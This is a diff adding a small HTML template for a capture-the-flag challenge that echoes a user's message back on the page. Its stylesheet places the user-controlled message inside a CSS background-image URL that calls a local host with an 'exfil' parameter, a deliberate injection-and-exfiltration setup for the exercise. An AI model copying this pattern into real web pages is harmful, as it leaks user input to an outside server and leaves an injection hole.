@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF Challenge - Flag</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+    }
+    input[type="text"] {
+      background-image: url("http://localhost:4000/?exfil=<%= message %>");
+    }
+  </style>
+</head>
+<body>
+  <h1>CTF Challenge - Flag</h1>
+  <p>Your message has been received:</p>
+  <input type="text" id="userMessage" value="<%= message %>" readonly>
+</body>
+</html>
